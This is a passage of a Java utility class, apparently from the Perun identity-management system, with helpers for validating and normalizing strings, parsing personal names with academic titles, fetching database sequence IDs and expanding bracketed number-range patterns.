\"urn:perun:member:attribute-def:def:phone\";\n\n\t/**\n\t * Replaces dangerous characters.\n\t * Replaces : with - and spaces with _.\n\t *\n\t * @param str string to be normalized\n\t * @return normalized string\n\t */\n\tpublic static String normalizeString(String str) {\n\t\tlog.trace(\"Entering normalizeString: str='{}'\", str);\n\t\treturn str.replace(':', '-').replace(' ', '_');\n\t}\n\n\tpublic static <T> boolean hasDuplicate(List<T> all) {\n\t\tSet<T> set = new HashSet<>(all.size());\n\t\t// Set#add returns false if the set does not change, which\n\t\t// indicates that a duplicate element has been added.\n\t\tfor (T each: all) if (!set.add(each)) return true;\n\t\treturn false;\n\t}\n\n\t/**\n\t * Joins Strings or any objects into a String. Use as\n\t * <pre>\n\t *  List<?> list = Arrays.asList(\"a\", 1, 2.0);\n\t *  String s = join(list,\",\");\n\t * </pre>\n\t * @param collection anything Iterable, like a {@link java.util.List} or {@link java.util.Collection}\n\t * @param separator any separator, like a comma\n\t * @return string with string representations of objects joined by separators\n\t */\n\tpublic static String join(Iterable<?> collection, String separator) {\n\t\tIterator<?> oIter;\n\t\tif (collection == null || (!(oIter = collection.iterator()).hasNext()))\n\t\t\treturn \"\";\n\t\tStringBuilder oBuilder = new StringBuilder(String.valueOf(oIter.next()));\n\t\twhile (oIter.hasNext())\n\t\t\toBuilder.append(separator).append(oIter.next());\n\t\treturn oBuilder.toString();\n\t}\n\n\t/**\n\t * Returns additionalUserExtSources from the subject. It's used for synchronization from different ExtSources. subjectFromExtSource was obtained from the ExtSource.\n\t *\n\t * @param sess perun session\n\t * @param subjectFromExtSource map with the subject\n\t * @return List<UserExtSource> all additional ExtSources from the subject, returned list will never contain null value\n\t * @throws InternalErrorException\n\t */\n\tpublic static List<UserExtSource> extractAdditionalUserExtSources(PerunSession sess, Map<String, String> subjectFromExtSource) throws InternalErrorException {\n\t\tList<UserExtSource> additionalUserExtSources = new ArrayList<>();\n\t\tfor (String attrName : subjectFromExtSource.keySet()) {\n\t\t\tif(attrName != null &&\n\t\t\t\tsubjectFromExtSource.get(attrName) != null &&\n\t\t\t\tattrName.startsWith(ExtSourcesManagerImpl.USEREXTSOURCEMAPPING)) {\n\t\t\t\tString login = subjectFromExtSource.get(\"login\");\n\n\t\t\t\tString[] userExtSourceRaw =  subjectFromExtSource.get(attrName).split(\"\\\\|\"); // Entry contains extSourceName|extSourceType|extLogin[|LoA]\n\t\t\t\tlog.debug(\"Processing additionalUserExtSource {}\",  subjectFromExtSource.get(attrName));\n\n\t\t\t\t//Check if the array has at least 3 parts, this is protection against outOfBoundException\n\t\t\t\tif(userExtSourceRaw.length < 3) {\n\t\t\t\t\tthrow new InternalErrorException(\"There is a missing mandatory part of additional user extSource value when processing it - '\" + attrName + \"'\");\n\t\t\t\t}\n\n\t\t\t\tString additionalExtSourceName = userExtSourceRaw[0];\n\t\t\t\tString additionalExtSourceType = userExtSourceRaw[1];\n\t\t\t\tString additionalExtLogin = userExtSourceRaw[2];\n\t\t\t\tint additionalExtLoa = 0;\n\t\t\t\t// Loa is not mandatory argument\n\t\t\t\tif (userExtSourceRaw.length>3 && userExtSourceRaw[3] != null) {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tadditionalExtLoa = Integer.parseInt(userExtSourceRaw[3]);\n\t\t\t\t\t} catch (NumberFormatException e) {\n\t\t\t\t\t\tthrow new ParserException(\"Subject with login [\" + login + \"] has wrong LoA '\" + userExtSourceRaw[3] + \"'.\", e, \"LoA\");\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tExtSource additionalExtSource;\n\n\t\t\t\tif (additionalExtSourceName == null || additionalExtSourceName.isEmpty() ||\n\t\t\t\t\tadditionalExtSourceType == null || additionalExtSourceType.isEmpty() ||\n\t\t\t\t\tadditionalExtLogin == null || additionalExtLogin.isEmpty()) {\n\t\t\t\t\tlog.error(\"User with login {} has invalid additional userExtSource defined {}.\", login, userExtSourceRaw);\n\t\t\t\t} else {\n\t\t\t\t\ttry {\n\t\t\t\t\t\t// Try to get extSource, with full extSource object (containg ID)\n\t\t\t\t\t\tadditionalExtSource = ((PerunBl) sess.getPerun()).getExtSourcesManagerBl().getExtSourceByName(sess, additionalExtSourceName);\n\t\t\t\t\t} catch (ExtSourceNotExistsException e) {\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t// Create new one if not exists\n\t\t\t\t\t\t\tadditionalExtSource = new ExtSource(additionalExtSourceName, additionalExtSourceType);\n\t\t\t\t\t\t\tadditionalExtSource = ((PerunBl) sess.getPerun()).getExtSourcesManagerBl().createExtSource(sess, additionalExtSource, null);\n\t\t\t\t\t\t} catch (ExtSourceExistsException e1) {\n\t\t\t\t\t\t\tthrow new ConsistencyErrorException(\"Creating existing extSource: \" + additionalExtSourceName);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t// Add additional user extSource\n\t\t\t\t\tadditionalUserExtSources.add(new UserExtSource(additionalExtSource, additionalExtLoa, additionalExtLogin));\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn additionalUserExtSources;\n\t}\n\n\t/**\n\t * Joins Strings or any objects into a String. Use as\n\t * <pre>\n\t *  String[] sa = { \"a\", \"b\", \"c\"};\n\t *  String s = join(list,\",\");\n\t * </pre>\n\t * @param objs array of objects\n\t * @param separator any separator, like a comma\n\t * @return string with string representations of objects joined by separators\n\t */\n\tpublic static String join(Object[] objs, String separator) {\n\t\tlog.trace(\"Entering join: objs='{}', separator='{}'\", objs, separator);\n\t\treturn join(Arrays.asList(objs),separator);\n\t}\n\n\t/**\n\t * Integer row mapper\n\t */\n\tpublic static final RowMapper<Integer> ID_MAPPER = (resultSet, i) -> resultSet.getInt(\"id\");\n\n\t/**\n\t * String row mapper\n\t */\n\tpublic static final RowMapper<String> STRING_MAPPER = (resultSet, i) -> resultSet.getString(\"value\");\n\n\t// FIXME prijde odstranit\n\tpublic static void checkPerunSession(PerunSession sess) throws InternalErrorException {\n\t\tnotNull(sess, \"sess\");\n\t}\n\n\t/**\n\t * Creates copy of given Map with Sets as values. The returned object contains a new Map\n\t * and new Sets, the {@link T} objects remain the same.\n\t *\n\t * @param original original Map\n\t * @param <T> parameter\n\t * @return new Map with new Sets as values\n\t */\n\tpublic static <T> Map<T, Set<T>> createDeepCopyOfMapWithSets(Map<T, Set<T>> original) {\n\t\tMap<T, Set<T>> copy = new HashMap<>();\n\t\tfor (T key : original.keySet()) {\n\t\t\tSet<T> setCopy = original.get(key) == null ? null : new HashSet<>(original.get(key));\n\t\t\tcopy.put(key, setCopy);\n\t\t}\n\t\treturn copy;\n\t}\n\n\t/**\n\t * Checks whether the object is null or not.\n\t *\n\t * @param e\n\t * @param name\n\t * @throws InternalErrorException which wraps NullPointerException\n\t */\n\tpublic static void notNull(Object e, String name) throws InternalErrorException {\n\t\tif(e == null){\n\t\t\tthrow new InternalErrorException(new NullPointerException(\"'\" + name + \"' is null\"));\n\t\t}\n\t}\n\n\t/**\n\t * Throws a MinSizeExceededException if the given value does not specified minLength.\n\t * If the value is null then MinSizeExceededException is thrown as well.\n\t *\n\t * @param propertyName name of checked property\n\t * @param minLength minimal length\n\t * @throws MinSizeExceededException when length of actualValue is lower than minLength or null\n\t */\n\tpublic static void checkMinLength(String propertyName, String actualValue, int minLength) throws MinSizeExceededException {\n\t\tif (actualValue == null) {\n\t\t\tthrow new MinSizeExceededException(\"The property '\" + propertyName + \"' does not have a minimal length equal to '\" + minLength + \"' because it is null.\");\n\t\t}\n\t\tif (actualValue.length() < minLength) {\n\t\t\tthrow new MinSizeExceededException(\"Length of '\" + propertyName + \"' is too short! MinLength=\" + minLength + \", ActualLength=\" + actualValue.length());\n\t\t}\n\t}\n\n\t/**\n\t * Throws a MaxSizeExceededException if the given value is longer than maxLength.\n\t * If the value is null then nothing happens.\n\t *\n\t * @param propertyName name of checked property\n\t * @param maxLength max length\n\t * @throws MaxSizeExceededException when length of actualValue is higher than maxLength\n\t */\n\tpublic static void checkMaxLength(String propertyName, String actualValue, int maxLength) throws MaxSizeExceededException {\n\t\tif (actualValue == null) {\n\t\t\treturn;\n\t\t}\n\t\tif (actualValue.length() > maxLength) {\n\t\t\tthrow new MaxSizeExceededException(\"Length of '\" + propertyName + \"' is too long! MaxLength=\" + maxLength + \", ActualLength=\" + actualValue.length());\n\t\t}\n\t}\n\n\t/**\n\t * Define, if some entity contain a diacritic symbol.\n\t *\n\t * @param name name of entity\n\t * @throws DiacriticNotAllowedException\n\t */\n\tpublic static void checkWithoutDiacritic(String name) throws DiacriticNotAllowedException{\n\n\t\tif(!Normalizer.isNormalized(name, Form.NFKD))throw new DiacriticNotAllowedException(\"Name of the entity is not in the normalized form NFKD (diacritic not allowed)!\");\n\n\t}\n\n\t/**\n\t * Define, if some entity contain a special symbol\n\t * Special symbol is everything except - numbers, letters and space\n\t *\n\t * @param name name of entity\n\t * @throws SpecialCharsNotAllowedException\n\t */\n\tpublic static void checkWithoutSpecialChars(String name) throws SpecialCharsNotAllowedException{\n\n\t\tif(!name.matches(\"^[0-9 \\\\p{L}]*$\")) throw new SpecialCharsNotAllowedException(\"The special chars in the name of entity are not allowed!\");\n\t}\n\n\t/**\n\t * Define, if some entity contain a special symbol\n\t * Special symbol is everything except - numbers, letters and space (and allowedSpecialChars)\n\t * The allowedSpecialChars are on the end of regular expresion, so the same rule must be observed.\n\t * (example, symbol - must be on the end of string) rules are the same like in regular expresion\n\t *\n\t * @param name name of entity\n\t * @param allowedSpecialChars this String must contain only special chars which are allowed\n\t * @throws SpecialCharsNotAllowedException\n\t */\n\tpublic static void checkWithoutSpecialChars(String name, String allowedSpecialChars) throws SpecialCharsNotAllowedException{\n\n\t\tif(!name.matches(\"^([0-9 \\\\p{L}\" + allowedSpecialChars + \"])*$\")) throw new SpecialCharsNotAllowedException(\"The special chars (except \" + allowedSpecialChars + \") in the name of entity are not allowed!\");\n\t}\n\n\t/**\n\t * Define, if some entity contain a number\n\t *\n\t * @param name\n\t * @throws NumbersNotAllowedException\n\t */\n\tpublic static void checkWithoutNumbers(String name) throws NumbersNotAllowedException{\n\n\t\tif(!name.matches(\"^([^0-9])*$\")) throw new NumbersNotAllowedException(\"The numbers in the name of entity are not allowed!\");\n\t}\n\n\t/**\n\t * Define, if some entity contain a space\n\t *\n\t * @param name\n\t * @throws SpaceNotAllowedException\n\t */\n\tpublic static void checkWithoutSpaces(String name)throws SpaceNotAllowedException{\n\n\t\tif(name.contains(\" \")) throw new SpaceNotAllowedException(\"The spaces in the name of entity are not allowed!\");\n\t}\n\n\t/**\n\t * Define, if some number is in range.\n\t * Example: number 4 is in range 4 - 12, number 3 is not\n\t *\n\t * @param number\n\t * @param lowestValue\n\t * @param highestValue\n\t * @throws NumberNotInRangeException\n\t */\n\tpublic static void checkRangeOfNumbers(int number, int lowestValue, int highestValue) throws NumberNotInRangeException {\n\n\t\tif(number<lowestValue || number>highestValue) throw new NumberNotInRangeException(\"Number is not in range, Lowest=\"+lowestValue+\" < Number=\"+number+\" < Highest=\"+highestValue);\n\t}\n\n\t/**\n\t * Gets the next number from the sequence. This function hides differences in the databases engines.\n\t *\n\t * @param jdbc\n\t * @param sequenceName\n\t * @return new ID\n\t * @throws InternalErrorException\n\t */\n\tpublic static int getNewId(JdbcTemplate jdbc, String sequenceName) throws InternalErrorException {\n\t\tString dbType;\n\t\tString url = \"\";\n\t\tString query;\n\t\t// try to deduce database type from jdbc connection metadata\n\t\ttry {\n\t\t\tDataSource ds = jdbc.getDataSource();\n\t\t\tif (ds instanceof HikariDataSource) {\n\t\t\t\turl = ((HikariDataSource) ds).getJdbcUrl();\n\t\t\t}\n\t\t} catch (Exception e) {\n\t\t\tlog.error(\"cannot get JDBC url\", e);\n\t\t}\n\n\t\tif (url.contains(\"hsqldb\")) {\n\t\t\tdbType = \"hsqldb\";\n\t\t} else if (url.contains(\"oracle\")) {\n\t\t\tdbType = \"oracle\";\n\t\t} else if (url.contains(\"postgresql\")) {\n\t\t\tdbType = \"postgresql\";\n\t\t} else {\n\t\t\tdbType = BeansUtils.getCoreConfig().getDbType();\n\t\t}\n\n\t\tswitch (dbType) {\n\t\t\tcase \"oracle\":\n\t\t\t\tquery = \"select \" + sequenceName + \".nextval from dual\";\n\t\t\t\tbreak;\n\t\t\tcase \"postgresql\":\n\t\t\t\tquery = \"select nextval('\" + sequenceName + \"')\";\n\t\t\t\tbreak;\n\t\t\tcase \"hsqldb\":\n\t\t\t\tquery = \"call next value for \" + sequenceName + \";\";\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tthrow new InternalErrorException(\"Unsupported DB type\");\n\t\t}\n\n\t\t// Decide which type of the JdbcTemplate is provided\n\t\ttry {\n\t\t\tInteger i = jdbc.queryForObject(query, Integer.class);\n\t\t\tif (i == null) {\n\t\t\t\tthrow new InternalErrorException(\"New ID should not be null.\");\n\t\t\t}\n\t\t\treturn i;\n\t\t} catch (RuntimeException e) {\n\t\t\tthrow new InternalErrorException(e);\n\t\t}\n\t}\n\n\t/**\n\t * Returns current time in millis. Result of this call can then be used by function getRunningTime().\n\t *\n\t * @return current time in millis.\n\t */\n\tpublic static long startTimer() {\n\t\treturn System.currentTimeMillis();\n\t}\n\n\t/**\n\t * Returns difference between startTime and current time in millis.\n\t *\n\t * @param startTime\n\t * @return difference between current time in millis and startTime.\n\t */\n\tpublic static long getRunningTime(long startTime) {\n\t\treturn System.currentTimeMillis()-startTime;\n\t}\n\n\n\t/**\n\t * Scans all classes accessible from the context class loader which belong to the given package and subpackages.\n\t *\n\t * @param packageName The base package\n\t * @return The classes\n\t * @throws ClassNotFoundException\n\t * @throws IOException\n\t */\n\tpublic static List<Class<?>> getClasses(String packageName) throws ClassNotFoundException, IOException {\n\t\tClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n\t\tassert classLoader != null;\n\t\tString path = packageName.replace('.', '/');\n\t\tEnumeration<URL> resources = classLoader.getResources(path);\n\t\tList<File> dirs = new ArrayList<>();\n\t\twhile (resources.hasMoreElements()) {\n\t\t\tURL resource = resources.nextElement();\n\t\t\tdirs.add(new File(resource.getFile()));\n\t\t}\n\t\tArrayList<Class<?>> classes = new ArrayList<>();\n\t\tfor (File directory : dirs) {\n\t\t\tclasses.addAll(findClasses(directory, packageName));\n\t\t}\n\t\treturn classes;\n\t}\n\n\tprivate static String limit(String s,int limit) {\n\t\tif(s==null) return null;\n\t\treturn s.length() > limit ? s.substring(0, limit) : s;\n\t}\n\n\tpublic static User createUserFromNameMap(Map<String, String> name) throws InternalErrorException {\n\t\tUser user = new User();\n\t\tif (name.get(FIRST_NAME) == null || name.get(LAST_NAME) == null || name.get(FIRST_NAME).isEmpty() || name.get(LAST_NAME).isEmpty()) {\n\t\t\tthrow new InternalErrorException(\"First name/last name is either empty or null when creating user\");\n\t\t}\n\t\tuser.setTitleBefore(limit(name.get(TITLE_BEFORE),40));\n\t\tuser.setFirstName(limit(name.get(FIRST_NAME),64));\n\t\tuser.setLastName(limit(name.get(LAST_NAME),64));\n\t\tuser.setTitleAfter(limit(name.get(TITLE_AFTER),40));\n\t\treturn user;\n\t}\n\n\t/**\n\t * Creates a new instance of User with names initialized from parsed rawName.\n\t * Imposes limit on leghts of fields.\n\t * @see #parseCommonName(String)\n\t * @param rawName raw name\n\t * @param fullNameRequired if true, throw exception if firstName or lastName is missing, do not throw exception otherwise\n\t * @return user\n\t */\n\tpublic static User parseUserFromCommonName(String rawName, boolean fullNameRequired) throws ParseUserNameException {\n\t\tMap<String, String> m = parseCommonName(rawName, fullNameRequired);\n\t\treturn createUserFromNameMap(m);\n\t}\n\n\t/**\n\t * @see Utils.parseCommonName(String rawName, boolean fullNameRequired) - where fullNameRequired is false\n\t */\n\tpublic static Map<String, String> parseCommonName(String rawName) {\n\t\ttry {\n\t\t\treturn Utils.parseCommonName(rawName, false);\n\t\t} catch (ParseUserNameException ex) {\n\t\t\tthrow new InternalErrorException(\"Unexpected behavior while parsing user name without full name requirement.\");\n\t\t}\n\t}\n\n\t/**\n\t * Try to parse rawName to keys: \"titleBefore\" \"firstName\" \"lastName\" \"titleAfter\"\n\t *\n\t * If rawName is null or empty, return map with empty values of all keys.\n\t *\n\t * Parsing procedure:\n\t * 1] prepare list of parts by replacing all characters \",\" and \"_\" by spaces\n\t * 2] change all sequence of invisible characters (space, tabulator etc.) to one space\n\t * 3] one by one try to parsing parts from the list\n\t *  - A] try to find all titleBefore parts\n\t *  - B] try to find one firstName part\n\t *  - C] try to find all lastName parts\n\t *  - D] if the rest is not lastName so save it to the title after\n\t *\n\t * Example of parsing rawName:\n\t * 1] rawName = \"Mgr. et Mgr.    Petr_Jiri R. Sojka, Ph.D., CSc.\"\n\t * 2] convert all ',' and '_' to spaces: rawName = \"Mgr. et Mgr.    Petr Jiri R. Sojka  Ph.D.  CSc.\"\n\t * 3] convert more than 1 invisible char to 1 space: rawName = \"Mgr. et Mgr. Petr Jiri R. Sojka Ph.D. CSc.\"\n\t * 4] parse string to list of parts by space: ListOfParts= [\"Mgr.\",\"et\",\"Mgr.\",\"Petr\",\"Jiri\",\"R.\",\"Sojka\",\"Ph.D.\",\"CSc.\"]\n\t * 5] first fill everything what can be in title before: titleBefore=\"Mgr. et Mgr.\"\n\t * 6] then fill everything what can be in first name (maximum 1 part): firstName=\"Petr\"\n\t * 7] then fill everything what can be in last name: lastName=\"Jiri R. Sojka\"\n\t * 8] everything else put to the title after: titleAfter=\"Ph.D. CSc.\"\n\t * 9] put these variables to map like key=value, for ex.: Map[titleBefore=\"Mgr. et Mgr.\",firstName=\"Petr\", ... ] and return this map\n\t *\n\t * @param rawName name to parse\n\t * @param fullNameRequired if true, throw exception if firstName or lastName is missing, do not throw exception otherwise\n\t * @return map string to string where are 4 keys (titleBefore,titleAfter,firstName and lastName) with their values (value can be null)\n\t * @throws ParseUserNameException when method was unable to parse both first name and last name from the rawName\n\t */\n\tpublic static Map<String, String> parseCommonName(String rawName, boolean fullNameRequired) throws ParseUserNameException {\n\t\t// prepare variables and result map\n\t\tMap<String, String> parsedName = new HashMap<>();\n\t\tString titleBefore = \"\";\n\t\tString firstName = \"\";\n\t\tString lastName = \"\";\n\t\tString titleAfter = \"\";\n\n\t\tif (rawName != null && !rawName.isEmpty()) {\n\t\t\t// replace all ',' and '_' characters for ' ' for rawName\n\t\t\trawName = rawName.replaceAll(\"[,_]\", \" \");\n\t\t\t// replace all invisible chars in row for ' '\n\t\t\trawName = rawName.replaceAll(\"\\\\s+\", \" \").trim();\n\n\t\t\t// split parts by space\n\t\t\tList<String> nameParts = new ArrayList<>(Arrays.asList(rawName.split(\" \")));\n\n\t\t\t// if length of nameParts is 1, save it to the lastName\n\t\t\tif(nameParts.size() == 1) {\n\t\t\t\tlastName = nameParts.get(0);\n\t\t\t\t// if length of nameParts is more than 1, try to choose which part belong to which value\n\t\t\t} else {\n\t\t\t\t// join title before name to single string with ' ' as delimiter\n\t\t\t\ttitleBefore = parsePartOfName(nameParts, new StringJoiner(\" \"), titleBeforePattern);\n\n\t\t\t\t// get first name as a next name part if pattern matches and nameParts are not empty\n\t\t\t\tif (!nameParts.isEmpty()) firstName = parsePartOfName(nameParts, new StringJoiner(\" \"), firstNamePattern);\n\n\t\t\t\t// join last names to single string with ' ' as delimiter\n\t\t\t\tif (!nameParts.isEmpty()) lastName = parsePartOfName(nameParts, new StringJoiner(\" \"), lastNamePattern);\n\n\t\t\t\t// if any nameParts are left join them to one string with ' ' as delimiter and assume they are titles after name\n\t\t\t\tif (!nameParts.isEmpty()) {\n\t\t\t\t\tStringJoiner titleAfterBuilder = new StringJoiner(\" \");\n\t\t\t\t\tfor (String namePart : nameParts) {\n\t\t\t\t\t\ttitleAfterBuilder.add(namePart);\n\t\t\t\t\t}\n\t\t\t\t\ttitleAfter = titleAfterBuilder.toString();\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t// add variables to map, empty string means null\n\t\tif (titleBefore.isEmpty()) titleBefore = null;\n\t\tparsedName.put(TITLE_BEFORE, titleBefore);\n\t\tif (firstName.isEmpty()) firstName = null;\n\t\tparsedName.put(FIRST_NAME, firstName);\n\t\tif (lastName.isEmpty()) lastName = null;\n\t\tparsedName.put(LAST_NAME, lastName);\n\t\tif (titleAfter.isEmpty()) titleAfter = null;\n\t\tparsedName.put(TITLE_AFTER, titleAfter);\n\n\t\tif(fullNameRequired) {\n\t\t\tif (parsedName.get(FIRST_NAME) == null)\n\t\t\t\tthrow new ParseUserNameException(\"Unable to parse first name from text.\", rawName);\n\t\t\tif (parsedName.get(LAST_NAME) == null)\n\t\t\t\tthrow new ParseUserNameException(\"Unable to parse last name from text.\", rawName);\n\t\t}\n\n\t\treturn parsedName;\n\t}\n\n\tprivate static String parsePartOfName(List<String> nameParts, StringJoiner result, Pattern pattern) {\n\t\tMatcher matcher = pattern.matcher(nameParts.get(0));\n\n\t\t// if the matcher does not match continue to the next part of the name\n\t\tif (!matcher.matches()) return result.toString();\n\n\t\tresult.add(nameParts.get(0));\n\t\tnameParts.remove(0);\n\t\t// when nameParts are depleted or firstName was found there is no reason to continue the recursion\n\t\tif (nameParts.isEmpty() || pattern.equals(firstNamePattern)) return result.toString();\n\n\t\t// continue the recursion to find the next part\n\t\treturn parsePartOfName(nameParts, result, pattern);\n\t}\n\n\t/**\n\t * Recursive method used to find all classes in a given directory and subdirs.\n\t *\n\t * @param directory   The base directory\n\t * @param packageName The package name for classes found inside the base directory\n\t * @return The classes\n\t * @throws ClassNotFoundException\n\t */\n\tprivate static List<Class<?>> findClasses(File directory, String packageName) throws ClassNotFoundException {\n\t\tList<Class<?>> classes = new ArrayList<>();\n\t\tif (!directory.exists()) {\n\t\t\treturn classes;\n\t\t}\n\t\tFile[] files = directory.listFiles();\n\t\tif (files != null) {\n\t\t\tfor (File file : files) {\n\t\t\t\tif (file.isDirectory()) {\n\t\t\t\t\tassert !file.getName().contains(\".\");\n\t\t\t\t\tclasses.addAll(findClasses(file, packageName + \".\" + file.getName()));\n\t\t\t\t} else if (file.getName().endsWith(\".class\")) {\n\t\t\t\t\tclasses.add(Class.forName(packageName + '.' + file.getName().substring(0, file.getName().length() - 6)));\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn classes;\n\t}\n\t/**\n\t * Return true, if char on position in text is escaped by '\\' Return false,\n\t * if not.\n\t *\n\t * @param text text in which will be searching\n\t * @param position position in text <0-text.length>\n\t * @return true if char is escaped, false if not\n\t */\n\tpublic static boolean isEscaped(String text, int position) {\n\t\tboolean escaped = false;\n\t\twhile (text.charAt(position) == '\\\\') {\n\t\t\tescaped = !escaped;\n\t\t\tposition--;\n\t\t\tif (position < 0) {\n\t\t\t\treturn escaped;\n\t\t\t}\n\t\t}\n\t\treturn escaped;\n\t}\n\n\t/**\n\t * Serialize map to string\n\t *\n\t * @param map\n\t * @return string of escaped map\n\t */\n\tpublic static String serializeMapToString(Map<String, String> map) {\n\t\tif(map == null) return \"\\\\0\";\n\t\tMap<String, String> attrNew = new HashMap<>(map);\n\t\tSet<String> keys = new HashSet<>(attrNew.keySet());\n\t\tfor(String s: keys) {\n\t\t\tattrNew.put(\"<\" + BeansUtils.createEscaping(s) + \">\", \"<\" + BeansUtils.createEscaping(attrNew.get(s)) + \">\");\n\t\t\tattrNew.remove(s);\n\t\t}\n\t\treturn attrNew.toString();\n\t}\n\n\tpublic static Attribute copyAttributeToViAttributeWithoutValue(Attribute copyFrom, Attribute copyTo) {\n\t\tcopyTo.setValueCreatedAt(copyFrom.getValueCreatedAt());\n\t\tcopyTo.setValueCreatedBy(copyFrom.getValueCreatedBy());\n\t\tcopyTo.setValueModifiedAt(copyFrom.getValueModifiedAt());\n\t\tcopyTo.setValueModifiedBy(copyFrom.getValueModifiedBy());\n\t\treturn copyTo;\n\t}\n\n\tpublic static Attribute copyAttributeToVirtualAttributeWithValue(Attribute copyFrom, Attribute copyTo) {\n\t\tcopyTo.setValue(copyFrom.getValue());\n\t\tcopyTo.setValueCreatedAt(copyFrom.getValueCreatedAt());\n\t\tcopyTo.setValueCreatedBy(copyFrom.getValueCreatedBy());\n\t\tcopyTo.setValueModifiedAt(copyFrom.getValueModifiedAt());\n\t\tcopyTo.setValueModifiedBy(copyFrom.getValueModifiedBy());\n\t\treturn copyTo;\n\t}\n\n\t/**\n\t * Method generates strings by pattern.\n\t * The pattern is string with square brackets, e.g. \"a[1-3]b\". Then the content of the brackets\n\t * is distributed, so the list is [a1b, a2b, a3c].\n\t * Multibrackets are aslo allowed. For example \"a[00-01]b[90-91]c\" generates [a00b90c, a00b91c, a01b90c, a01b91c].\n\t *\n\t * @param pattern\n\t * @return list of all generated strings\n\t */\n\tpublic static List<String> generateStringsByPattern(String pattern) throws WrongPatternException {\n\t\tList<String> result = new ArrayList<>();\n\n\t\t// get chars between the brackets\n\t\tList<String> values = new ArrayList<>(Arrays.asList(pattern.split(\"\\\\[[^]]*]\")));\n\t\t// get content of the brackets\n\t\tList<String> generators = new ArrayList<>();\n\t\tPattern generatorPattern = Pattern.compile(\"\\\\[([^]]*)]\");\n\t\tMatcher m = generatorPattern.matcher(pattern);\n\t\twhile (m.find()) {\n\t\t\tgenerators.add(m.group(1));\n\t\t}\n\n\t\t// if values strings contain square brackets, wrong syntax, abort\n\t\tfor (String value: values) {\n\t\t\tif (value.contains(\"]\") || (value.contains(\"[\"))) {\n\t\t\t\tthrow new WrongPatternException(\"The pattern \\\"\" + pattern + \"\\\" has a wrong syntax. Too much closing brackets.\");\n\t\t\t}\n\t\t}\n\n\t\t// if generators strings contain square brackets, wrong syntax, abort\n\t\tfor (String generator: generators) {\n\t\t\tif (generator.contains(\"]\") || (generator.contains(\"[\"))) {\n\t\t\t\tthrow new WrongPatternException(\"The pattern \\\"\" + pattern + \"\\\" has a wrong syntax. Too much opening brackets.\");\n\t\t\t}\n\t\t}\n\n\t\t// list, that contains list for each generator, with already generated numbers\n\t\tList<List<String>> listOfGenerated = new ArrayList<>();\n\n\t\tPattern rangePattern = Pattern.compile(\"^(\\\\d+)-(\\\\d+)$\");\n\t\tfor (String range: generators) {\n\t\t\tm = rangePattern.matcher(range);\n\t\t\tif (m.find()) {\n\t\t\t\tString start = m.group(1);\n\t\t\t\tString end = m.group(2);\n\t\t\t\tint startNumber;\n\t\t\t\tint endNumber;\n\t\t\t\ttry {\n\t\t\t\t\tstartNumber = Integer.parseInt(start);\n\t\t\t\t\tendNumber = Integer.parseInt(end);\n\t\t\t\t} catch (NumberFormatException ex) {\n\t\t\t\t\tthrow new WrongPatternException(\"The pattern \\\"\" + pattern + \"\\\" has a wrong syntax. Wrong format of the range.\");\n\t\t\t\t}\n\n\t\t\t\t// if end is before start -> abort\n\t\t\t\tif (startNumber > endNumber) {\n\t\t\t\t\tthrow new WrongPatternException(\"The pattern \\\"\" + pattern + \"\\\" has a wrong syntax. Start number has to be lower than end number.\");\n\n\t\t\t\t}\n\n\t\t\t\t// find out, how many zeros are before start number\n\t\t\t\tint zerosInStart = 0;\n\t\t\t\tint counter = 0;\n\t\t\t\twhile ( (start.charAt(counter) == '0') && (counter < start.length()-1) ) {\n\t\t\t\t\tzerosInStart++;\n\t\t\t\t\tcounter++;\n\t\t\t\t}\n\n\t\t\t\tString zeros = start.substring(0, zerosInStart);\n\t\t\t\tint oldNumberOfDigits = String.valueOf(startNumber).length();\n\n\t\t\t\t// list of already generated numbers\n\t\t\t\tList<String> generated = new ArrayList<>();\n\t\t\t\twhile (endNumber >= startNumber) {\n\t\t\t\t\t// keep right number of zeros before number\n\t\t\t\t\tif (String.valueOf(startNumber).length() == oldNumberOfDigits +1) {\n\t\t\t\t\t\tif (!zeros.isEmpty()) zeros = zeros.substring(1);\n\t\t\t\t\t}\n\t\t\t\t\tgenerated.add(zeros + startNumber);\n\t\t\t\t\toldNumberOfDigits = String.valueOf(startNumber).length();\n\t\t\t\t\tstartNumber++;\n\t\t\t\t}\n\n\t\t\t\tlistOfGenerated.add(generated);\n\n\t\t\t} else {\n\t\t\t\t// range is not in the format number-number -> abort\n\t\t\t\tthrow new WrongPatternException(\"The pattern \\\"\" + pattern + \"\\\" has a wrong syntax. The format numer-number not found.\");\n\t\t\t}\n\t\t}\n\n\t\t// add values among the generated numbers as one item lists\n\t\tList<List<String>> listOfGeneratorsAndValues = new ArrayList<>();\n\t\tint index = 0;\n\n\t\tfor (List<String> list : listOfGenerated) {\n\t\t\tif (index < values.size()) {\n\t\t\t\tList<String> listWithValue = new ArrayList<>();\n\t\t\t\tlistWithValue.add(values.get(index));\n\t\t\t\tlistOfGeneratorsAndValues.add(listWithValue);\n\t\t\t\tindex++;\n\t\t\t}\n\t\t\tlistOfGeneratorsAndValues.add(list);\n\t\t}\n\n\t\t// complete list with remaining values\n\t\tfor (int i = index; i < values.size(); i++) {\n\t\t\tList<String> listWithValue = new ArrayList<>();\n\t\t\tlistWithValue.add(values.get(i));\n\t\t\tlistOfGeneratorsAndValues.add(listWithValue);\n\t\t}\n\n\t\t// generate all posibilities\n\t\treturn getCombinationsOfLists(listOfGeneratorsAndValues);\n\t}\n\n\t/**\n\t * Method generates all combinations of joining of strings.\n\t * It respects given order of lists.\n\t * Example: input: [[a,b],[c,d]], output: [ac,ad,bc,bd]\n\t * @param lists list of lists, which will be joined\n\t * @return all joined strings\n\t */\n\tprivate static List<String> getCombinationsOfLists(List<List<String>> lists) {\n\t\tif (lists.isEmpty()) {\n\t\t\t// this should not happen\n\t\t\treturn new ArrayList<>();\n\t\t}\n\t\tif (lists.size() == 1) {\n\t\t\treturn lists.get(0);\n\t\t}\n\t\tList<String> result = new ArrayList<>();\n\n\t\tList<String> list = lists.remove(0);\n\t\t// get recursively all posibilities without first list\n\t\tList<String> posibilities = 